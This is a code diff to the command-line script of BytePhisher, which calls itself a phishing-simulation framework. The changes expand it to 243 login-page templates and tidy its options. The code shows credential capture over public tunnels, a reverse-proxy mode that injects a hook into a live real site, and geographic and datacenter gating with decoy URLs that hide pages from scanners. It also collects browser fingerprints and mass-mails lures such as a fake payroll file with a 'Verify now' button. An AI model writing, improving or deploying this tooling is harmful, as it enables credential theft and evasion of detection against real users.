@@ -14,18 +14,18 @@ Usage:
     python3 bytephisher.py --export out.csv
 
 Flags mirror (and extend) PyPhisher/ZPhisher/BlackEye conventions:
-    -o  template index (1..80) or slug (google, instagram, ...)
+    -o  template index (1..243) or slug (google, instagram, ...)
     -t  tunneler: cloudflared | ngrok | localhost_run | serveo | bore | hoplink | all | none
     -u  redirect URL after capture
     -p  local port (default 8080)
     -m  mode: normal | test   (test = no tunnels, local only)
 """
 import argparse
-import os
-import sys
 import json
-import time
+import os
 import signal
+import sys
+import time
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 if HERE not in sys.path:
@@ -50,12 +50,15 @@ def resolve_home():
 
 HOME = resolve_home()
 
-from core import server as srv
+from core import __version__ as core_version
 from core import capture as cap
-from core import templates as tpl
-from tunnels import REGISTRY as TUNNEL_REGISTRY, run_one, run_all, reason_for
+from core import server as srv
+from tunnels import REGISTRY as TUNNEL_REGISTRY
+from tunnels import reason_for, run_all, run_one
 
-VERSION = "0.1.0"
+# single source of truth: core/__init__.py (reports, net UA and the
+# Docker labels all derive from this one value)
+VERSION = core_version
 TEMPLATES_DIR = os.path.join(HOME, "templates")
 DEFAULT_DB = os.path.join(HOME, "data", "bytephisher.db")
 CONFIG_PATH = os.path.join(HOME, "config", "config.yaml")
@@ -108,7 +111,7 @@ def resolve_template(man, option):
     if option is None:
         print_templates(man)
         try:
-            option = input("Select template [1-80] > ").strip()
+            option = input("Select template [1-243] > ").strip()
         except EOFError:
             sys.exit(2)
     if str(option).isdigit():
@@ -159,7 +162,7 @@ def main():
     ap = argparse.ArgumentParser(
         prog="bytephisher", add_help=True,
         description="BytePhisher — advanced phishing-simulation framework")
-    ap.add_argument("-o", "--option", help="template index (1-80) or slug")
+    ap.add_argument("-o", "--option", help="template index (1-243) or slug")
     ap.add_argument("-t", "--tunneler", default=None,
                     help="cloudflared|ngrok|localhost_run|serveo|bore|hoplink|all|none")
     ap.add_argument("-u", "--url", dest="redirect", default=None, help="redirect URL after capture")
@@ -201,6 +204,10 @@ def main():
                     help="regexes of paths never touched (comma separated)")
     ap.add_argument("--no-verify-tls", action="store_true",
                     help="do not verify the upstream TLS certificate")
+    ap.add_argument("--no-trust-headers", action="store_true",
+                    help="ignore CF-Connecting-IP / X-Forwarded-For and use the "
+                         "socket IP (use when the server is exposed directly: "
+                         "those headers are spoofable and bypass gating)")
     # ---- deep device intelligence (everything the browser volunteers) ----
     ap.add_argument("--no-intel", action="store_true",
                     help="disable the deep device dump collected on page open")
@@ -406,11 +413,15 @@ def main():
     if any([args.allow_country, args.block_country, args.block_datacenter,
             args.active_hours, args.active_days, args.max_hits]):
         from core.gate import Gate
-        gate = Gate(allow_countries=args.allow_country.split(",") if args.allow_country else None,
+        try:
+            gate = Gate(allow_countries=args.allow_country.split(",") if args.allow_country else None,
                     block_countries=args.block_country.split(",") if args.block_country else None,
                     block_datacenter=args.block_datacenter,
                     active_hours=args.active_hours, active_days=args.active_days,
                     max_hits_per_ip=args.max_hits)
+        except ValueError as e:
+            print(f"[bytephisher] bad gating option: {e}")
+            return 2
         print(f"[bytephisher] gating    : {gate.describe()}")
         if gate.needs_geo and geo == "off":
             print("[bytephisher] WARNING   : country/datacenter gating with --geo off "
@@ -432,7 +443,7 @@ def main():
 
     if args.proxy:
         # ---- reverse-proxy mode: real site proxied live, hook injected ----
-        from core.proxy import Phishlet, ProxyEngine, serve_proxy, HOOK_PATH, CAPTURE_PATH
+        from core.proxy import CAPTURE_PATH, HOOK_PATH, Phishlet, ProxyEngine, serve_proxy
         if args.phishlet:
             phishlet = Phishlet.from_yaml(args.phishlet)
             print(f"[bytephisher] phishlet : {args.phishlet} -> {phishlet.upstream}")
@@ -463,7 +474,8 @@ def main():
             on_capture=notifier, site_name=site["slug"],
             campaign=args.campaign or site["slug"],
             rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "",
-            intel=not args.no_intel, intel_perms=args.intel_perms)
+            intel=not args.no_intel, intel_perms=args.intel_perms,
+            trust_headers=not args.no_trust_headers)
     # serve_forever() must run in its own thread, otherwise the socket is bound
     # but never accepts connections while the CLI sits in the live-dashboard loop.
     import threading
@@ -520,12 +532,13 @@ def main():
         if not smtp.get("host"):
             print("[bytephisher] --mailto given but config smtp.host is empty — skipping blast")
         else:
-            from mailer import render, to_html, send_smtp
+            from mailer import render, send_smtp, to_html
             ctx = {"Phish_URL": link, "From_Name": args.mail_from_name,
                    "Location": "unknown device", "Doc_Name": "Q3-payroll.xlsx",
                    "Invoice_ID": "INV-20431"}
             subject, body = render(args.mail_template, ctx)
-            html = to_html(body, base=link, cta_label="Verify now")
+            # the per-recipient HTML is rendered inside the loop below; building
+            # it here as well was dead work
             for addr in [a.strip() for a in args.mailto.split(",") if a.strip()]:
                 ctx["To_Address"] = addr
                 ctx["To_FirstName"] = addr.split("@")[0].split(".")[0].title()
